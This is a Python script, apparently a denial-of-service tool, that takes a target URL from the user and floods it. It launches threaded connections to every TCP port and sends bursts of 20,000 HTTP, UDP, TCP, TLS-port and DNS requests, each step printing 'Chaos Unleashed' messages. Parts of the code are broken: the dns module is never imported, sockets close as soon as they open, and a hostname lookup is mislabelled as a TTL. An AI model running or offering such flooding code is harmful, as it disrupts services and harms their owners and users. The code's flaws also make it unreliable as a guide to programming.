def print_banner():
    banner = """
    ──────    _____            __                                  _______                      
   /     |          /  |                                /       \\                     
   $$$$$ |  ______  $$ |   __   ______    ______        $$$$$$$  |  ______    _______ 
      $$ | /      \\ $$ |  /  | /      \\  /      \\       $$ |  $$ | /      \\  /       |
 __   $$ |/$$$$$$  |$$ |_/$$/ /$$$$$$  |/$$$$$$  |      $$ |  $$ |/$$$$$$  |/$$$$$$$/ 
/  |  $$ |$$ |  $$ |$$   $$<  $$    $$ |$$ |  $$ |      $$ |  $$ |$$ |  $$ |$$      \\ 
$$ \\__$$ |$$ \\__$$ |$$$$$$  \\ $$$$$$$$/ $$ |  $$ |      $$ |__$$ |$$ \\__$$ | $$$$$$  |
$$    $$/ $$    $$ | $$ | $$  |$$       |$$ |  $$ |      $$    $$ |$$    $$ | /     $$/ 
 $$$$$$/   $$$$$$/  $$/   $$/  $$$$$$$/ $$ |  $$ |      $$$$$$$/   $$$$$$/  $$$$$$$/  ──────
                                                                                         - IXXI.X7 -
    """
    print(banner)








import requests



import random



import socket



import threading



import urllib3



from requests.packages.urllib3.exceptions import InsecureRequestWarning







def generate_payload():



    return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(10))







def hit_port(target_ip, port):



    try:



        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tcp_socket:



            tcp_socket.settimeout(0.1)



            tcp_socket.connect((target_ip, port))



            tcp_socket.send(generate_payload().encode())



            response = tcp_socket.recv(1024)



            print("[Port Chaos Unleashed] Port {}: {}".format(port, response))



    except (socket.timeout, ConnectionRefusedError):



        pass







def unleash_port_chaos(target_ip):



    threads = []



    for port in range(1, 65536):



        for _ in range(20000):



            thread = threading.Thread(target=hit_port, args=(target_ip, port))



            threads.append(thread)



            thread.start()



    for thread in threads:



        thread.join()



    print("Chaos has been unleashed upon all ports of {}".format(target_ip))







def send_http_request(url):



    urllib3.disable_warnings(InsecureRequestWarning)



    headers = {



        'User-Agent': generate_payload(),



        'Referer': 'https://www.google.com/',



        'Cookie': 'session_id=' + generate_payload(),



    }



    try:



        with requests.Session() as session:



            for _ in range(20000):



                response = session.get(url, headers=headers, verify=False)



                if response.status_code == 200:



                    print("[HTTP Chaos Unleashed]")



                else:



                    print("[HTTP Chaos Failed]")



    except requests.exceptions.RequestException as e:



        print("[Connection Error]:", e)







def send_udp_request(url):



    udp_sockets = []



    udp_payload = generate_payload().encode()



    for _ in range(20000):



        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp_socket:



            udp_sockets.append(udp_socket)



            udp_socket.sendto(udp_payload, (url, 80))



    print("[UDP Chaos Unleashed]")







def send_tcp_request(url):



    tcp_sockets = []



    tcp_payload = generate_payload().encode()



    for _ in range(20000):



        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tcp_socket:



            tcp_sockets.append(tcp_socket)



            tcp_socket.connect((url, 80))



            tcp_socket.send(tcp_payload)



    print("[TCP Chaos Unleashed]")







def send_tls_request(url):



    tls_sockets = []



    tls_payload = generate_payload().encode()



    for _ in range(20000):



        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tls_socket:



            tls_sockets.append(tls_socket)



            tls_socket.connect((url, 443))



            tls_socket.send(tls_payload)



    print("[TLS Chaos Unleashed]")







def send_dns_request(url):



    for _ in range(20000):



        try:



            resolver = dns.resolver.Resolver()



            resolver.nameservers = ['8.8.8.8', '8.8.4.4']



            answer = resolver.query(url)



            if answer:



                print("[DNS Chaos Unleashed]")



        except dns.resolver.NXDOMAIN:



            print("[DNS Chaos Failed]")







def send_ttl_request(url):



    for _ in range(20000):



        try:



            ttl = socket.gethostbyname_ex(url)[2][-1]



            print("[TTL Chaos Unleashed] TTL for {}: {}".format(url, ttl))



        except socket.gaierror:



            print("[TTL Chaos Failed]")







if __name__ == "__main__":



    print_banner()



    target_url = input("Enter the target URL: ")



    requests.packages.urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



    unleash_port_chaos(target_url)



    send_http_request(target_url)



    send_udp_request(target_url)



    send_tcp_request(target_url)



    send_tls_request(target_url)



    send_dns_request(target_url)



    send_ttl_request(target_url)
